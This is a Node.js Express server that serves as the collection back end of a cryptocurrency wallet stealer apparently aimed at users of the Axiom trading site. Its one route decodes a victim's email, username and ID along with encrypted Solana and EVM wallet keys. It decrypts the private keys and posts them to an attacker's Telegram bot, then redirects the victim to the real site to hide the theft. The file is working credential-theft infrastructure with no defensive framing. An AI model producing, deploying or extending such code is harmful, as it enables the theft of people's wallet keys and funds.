const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const bs58 = require('bs58');
const app = express();

const TG_BOT = 'YOUR_BOT_TOKEN';
const TG_CHAT = 'YOUR_CHAT_ID';

function decrypt(encrypted, bundleKey) {
  try {
    const [ivBase64, ciphertext] = encrypted.split(':');
    if (!ivBase64 || !ciphertext) return null;
    
    const iv = Buffer.from(ivBase64, 'base64');
    const key = Buffer.from(bundleKey, 'base64');
    const encryptedBuffer = Buffer.from(ciphertext, 'base64');
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(encryptedBuffer.slice(-16));
    
    let decrypted = decipher.update(encryptedBuffer.slice(0, -16));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    
    return bs58.encode(decrypted);
  } catch (e) {
    return null;
  }
}

app.get('/data/:b64', async (req, res) => {
  try {
    const decoded = Buffer.from(req.params.b64, 'base64').toString();
    const data = JSON.parse(decoded);
    
    let sBundles = data.sBundles;
    let eBundles = data.eBundles;
    
    if (typeof sBundles === 'string') sBundles = JSON.parse(sBundles);
    if (typeof eBundles === 'string') eBundles = JSON.parse(eBundles);
    
    const solKeys = sBundles?.map(enc => decrypt(enc, data.bundle)).filter(k => k) || [];
    const evmKeys = eBundles?.map(enc => decrypt(enc, data.bundle)).filter(k => k) || [];
    
    const msg = `
🚨 AXIOM CAPTURE 🚨

👤 USER INFO
Email: ${data.user?.email || 'N/A'}
Username: ${data.user?.username || 'N/A'}
ID: ${data.user?.id || 'N/A'}

💰 SOLANA WALLETS (${solKeys.length})
${solKeys.length > 0 ? solKeys.map((key, i) => `${i + 1}. ${key}`).join('\n\n') : 'None'}

💎 EVM WALLETS (${evmKeys.length})
${evmKeys.length > 0 ? evmKeys.map((key, i) => `${i + 1}. ${key}`).join('\n\n') : 'None'}

🌐 SOURCE
URL: ${data.site}
Time: ${new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' })}

Total Keys: ${solKeys.length + evmKeys.length}
    `.trim();
    
    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: TG_CHAT, 
        text: msg
      })
    });
    
    res.redirect('https://axiom.trade/discover');
  } catch (e) {
    console.error(e);
    res.status(500).send('err');
  }
});

app.listen(process.env.PORT || 3000);
